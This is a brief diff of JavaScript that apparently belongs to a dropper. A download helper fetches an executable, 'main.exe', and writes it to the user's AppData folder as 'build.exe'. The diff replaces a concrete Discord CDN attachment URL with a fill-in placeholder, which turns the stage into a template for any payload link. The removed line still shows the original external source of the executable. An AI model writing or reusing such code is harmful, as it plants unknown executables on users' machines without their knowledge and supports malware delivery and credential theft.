@@ -140,7 +140,7 @@ var download = function(uri, filename, callback){
     request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
   });
 };
-download('https://cdn.discordapp.com/attachments/785666980978884659/833221650283626526/main.exe', `${appdata}/build.exe`, function(){
+download('MAIN.EXE DIRECT DOWNLOAD LINK', `${appdata}/build.exe`, function(){
 });
 }
 
